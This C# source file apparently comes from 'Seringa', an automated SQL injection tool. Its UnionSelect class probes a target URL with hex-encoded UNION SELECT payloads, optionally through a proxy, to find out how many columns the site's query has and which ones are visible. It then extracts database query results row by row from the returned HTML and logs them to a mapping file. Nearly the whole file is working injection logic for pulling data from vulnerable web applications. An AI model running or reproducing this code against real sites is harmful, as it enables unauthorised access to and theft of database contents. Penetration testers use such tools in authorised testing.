using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Seringa.Engine.Interfaces;
using Seringa.Engine.Implementations.QueryRunners;
using Seringa.Engine.Utils;
using Seringa.Engine.Exceptions;
using Seringa.Engine.Utils.Extensions;
using Seringa.Engine.DataObjects;
using Seringa.Engine.Static;

namespace Seringa.Engine.Implementations.InjectionStrategies
{
    public class UnionSelect : IInjectionStrategy
    {
        #region Constructors
        public UnionSelect()
        {
            QueryRunner = new SimpleQueryRunner();
        }
        #endregion Constructors

        #region Properties

        #region IWebOperation
        public IProxyDetails ProxyDetails { get; set; }
        public IQueryRunner QueryRunner { get; set; }
        public bool UseProxy { get; set; }
        #endregion IWebOperation

        #region IInjectionStrategy

        public IList<int> ColumnIndexes
        {
            get
            {
                return _visibleColumnIndexes;
            }
            set
            {
                _visibleColumnIndexes = value;
            }
        }

        public int NrColumnsInOriginalQuery
        {
            get
            {
                return _nrCols;
            }
            set
            {
                _nrCols = value;
            }
        }

        public int NumberOfResultsPerRequest
        {
            get
            {
                return _nrVisibleCols;
            }
            set
            {
                _nrVisibleCols = value;
            }
        }

        public string Url { get; set; }
        public string DisplayName
        {
            get
            {
                return "Union select method";
            }
        }
        public int MaxCols
        {
            get
            {
                return _maxCols;
            }
            set
            {
                _maxCols = value;
            }
        }

        public string SelectedDb { get; set; }
        public string SelectedTable { get; set; }
        public bool DetailedExceptions { get; set; }
        public string MappingFile { get; set; }


        public ExploitDetails ExploitDetails { get; set; }
        public PayloadDetails PayloadDetails { get; set; }
        #endregion IInjectionStrategy

        #endregion Properties

        #region Private
        #region Fields
        /// <summary>
        /// not all columns might appear in the page html, indexes of those that do get stored here
        /// </summary>
        IList<int> _visibleColumnIndexes = new List<int>();
        int _maxCols = 20;
        int _nrCols = 0;
        int _nrVisibleCols = 0;
        #endregion Fields
        #endregion Private

        #region Methods

        #region IInjectionStrategy

        public bool TestIfVulnerable()
        {
            bool result = false;

            StringBuilder sbCurExploit = new StringBuilder();
            string query = string.Empty;
            string pageHtml = string.Empty;

            if(string.IsNullOrEmpty(Url))
                throw new Exception("No url provided so cannot test vulnerability");

            for (int i = 0; i < _maxCols; i++)
            {
                if(i > 0)
                    sbCurExploit.Append(",");
                //sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,i); 
                sbCurExploit.Append(UrlHelpers.HexEncodeValue(string.Format(GeneralPayloads.UnionBasedSelectValue, i)));
                //ExploitDetails - check if null because it breaks
                query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
                pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
                if (pageHtml.Contains(GeneralPayloads.UnionBasedErrorMessage) && !pageHtml.Contains(GeneralPayloads.UnionBasedTestValue) )
                    continue;
                else
                {
                    if (i > 0)
                    {
                        _nrCols = i+1;

                        var stringResults = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);
                        _visibleColumnIndexes = stringResults.Where(r => !string.IsNullOrEmpty(r)).Distinct().Select(r => int.Parse(r)).ToList();
                        _nrVisibleCols = _visibleColumnIndexes.Count();

                        if (_nrVisibleCols > 0)
                        {

                            #region write to mapping file
                            if (!string.IsNullOrEmpty(MappingFile))
                            {
                                XmlHelpers.ChangeMappingFileElementValue(MappingFile, "/map/injection-strategy/columns/originalquery", _nrCols.ToString(),
                                    this, (this.ExploitDetails != null) ? this.ExploitDetails.Dbms : string.Empty);
                                XmlHelpers.ChangeMappingFileElementValue(MappingFile, "/map/injection-strategy/columns/resultinghtml",
                                    _nrVisibleCols.ToString(), this, (this.ExploitDetails != null) ? this.ExploitDetails.Dbms : string.Empty);
                                XmlHelpers.ChangeMappingFileElementValue(MappingFile, "/map/injection-strategy/columns/indexes",
                                                                            ListHelpers.ListToCommaSeparatedValues(_visibleColumnIndexes),
                                                                            this, (this.ExploitDetails != null) ? this.ExploitDetails.Dbms : string.Empty);
                            }
                            #endregion write to mapping file

                            result = true;
                        }
                        else
                        {
                            result = false;
                            break;
                        }
                    }
                    else result = false;

                    break;
                }
            }

            return result;
        }

        public int GetTotalNoOfCustomQueryResultRows()
        {
            if (_nrCols == 0 || _nrVisibleCols == 0 || _visibleColumnIndexes.Count() == 0)
                if (!TestIfVulnerable())
                    throw new SqlInjException("Given script is not injectable using current injection strategy");

            int count = 0;
            string generatedpayload = string.Empty;

            if(PayloadDetails == null)
                return 0;

            if(string.IsNullOrEmpty(PayloadDetails.Payload))
                return 0;

            if(PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Single)
                return 1;

            generatedpayload = PayloadDetails.Payload;

            if (PayloadDetails.Params != null && PayloadDetails.Params.Count() > 0)
                foreach(var param in PayloadDetails.Params)
                    generatedpayload = generatedpayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));

            generatedpayload = string.Format(GeneralPayloads.QueryResultCount,generatedpayload);

            StringBuilder sbCurExploit = new StringBuilder();

            sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectResultWrapper, generatedpayload);
            
            if(_nrCols > 1)
                sbCurExploit.Append(",");

            for (int j = 1; j < _nrCols; j++)
            {
                sbCurExploit.Append(j.ToString());
                if (j < _nrCols - 1)
                    sbCurExploit.Append(",");
            }

            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);

            var result = HtmlHelpers.GetAnswerFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);

            int.TryParse(result, out count);
            return count;
        }
        public string GetSingleCustomQueryResultRow(int startingFrom)
        {
            string results = string.Empty;
            StringBuilder sbResult = new StringBuilder();

            string generatedPayload = PayloadDetails.Payload;

            if (PayloadDetails.Params != null && PayloadDetails.Params.Count() > 0)
                foreach (var param in PayloadDetails.Params)
                    generatedPayload = generatedPayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));


            StringBuilder sbCurExploit = new StringBuilder();
            
            int columnIndexCounter = 0;
            string generatedPayloadWithLimit = string.Empty;

            for (int j = 0; j < _nrCols; j++)
            {
                if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
                    generatedPayloadWithLimit = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom + j);

                if (_visibleColumnIndexes.Contains(j))
                {
                    /*
                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectCountedResultWrapper, _visibleColumnIndexes[columnIndexCounter],
                        (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple) ? generatedPayloadWithLimit : generatedPayload);
                    */

                    sbCurExploit.Append(GeneralPayloads.UnionBasedSelectCountedResultWrapperPart1);
                    sbCurExploit.Append(UrlHelpers.HexEncodeValue(string.Format(GeneralPayloads.UnionBasedSelectCountedResultWrapperPart2, 
                                                                                    _visibleColumnIndexes[columnIndexCounter])));
                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectCountedResultWrapperPart3, 
                        (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple) ? generatedPayloadWithLimit : generatedPayload);

                    columnIndexCounter++;
                }
                else
                    sbCurExploit.AppendFormat(j.ToString());

                if (j < _nrCols - 1)
                    sbCurExploit.Append(",");
            }


            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
            IList<string> resultsBatch = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);

            string actualValue = string.Empty;
            int separatorIndex = 0;
            int columnIndex = 0;
            string columnIndexString = "";
            IList<int> columnsProcessed = new List<int>();
            foreach (string singleResult in resultsBatch)
            {
                //@TODO: strip scripts
                separatorIndex = singleResult.IndexOf(GeneralPayloads.UnionBasedResultSeparator);
                if (separatorIndex != -1)
                {
                    columnIndexString = singleResult.Substring(0,separatorIndex);
                    if(!int.TryParse(columnIndexString,out columnIndex))
                        continue;

                    if (columnsProcessed.Contains(columnIndex))
                        continue;
                    else
                        columnsProcessed.Add(columnIndex);

                    actualValue = singleResult.Substring(separatorIndex + GeneralPayloads.UnionBasedResultSeparator.Length);

                    if (!string.IsNullOrEmpty(MappingFile))
                        XmlHelpers.SaveToMappingFile(MappingFile, PayloadDetails, actualValue, this,
                                                        (this.ExploitDetails != null) ? this.ExploitDetails.Dbms : string.Empty);

                    sbResult.Append(actualValue);
                    sbResult.Append(Environment.NewLine);
                }

                if (columnsProcessed.Count == _visibleColumnIndexes.Count)
                    break;
            }
            return sbResult.ToString(); 
        }

        #endregion IInjectionStrategy

        #endregion Methods
    }
}
